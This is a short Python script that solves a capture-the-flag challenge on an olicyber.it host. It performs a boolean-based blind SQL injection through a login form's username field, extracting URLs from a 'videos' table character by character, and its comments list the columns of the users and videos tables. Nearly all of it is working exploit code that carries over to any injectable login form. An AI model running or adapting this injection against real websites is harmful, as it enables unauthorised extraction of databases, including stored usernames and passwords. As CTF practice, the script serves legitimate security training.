import requests
import string

url = "http://m0lecon-plus.challs.olicyber.it/"

characters = string.ascii_letters + string.digits + ":\\/{}_-."

tables = {"users", "videos", "all", "applicable", "events", "files", "global", "key"}

name = ""
for i in range(30): # La flag si trova al 15° url
    while True:
        found = False
        for c in characters:
            INJ = f'A%" AND (SELECT CASE WHEN (SELECT url FROM challenge.videos LIMIT 1 OFFSET {i}) LIKE "{name}{c}%" THEN 1 ELSE 0 END)=1-- -'

            payload = {
                "username":INJ,
                "password":"palle"
            }

            r = requests.post(url, data=payload)

            if "The flag is not here..." in r.text:            
                name += c
                found = True
                break

        if not found:
            print(f"{i}: {name}")
            name = ""
            break

# users:
# id | username | password | user | current | total
    
# videos:
# id | url | hidden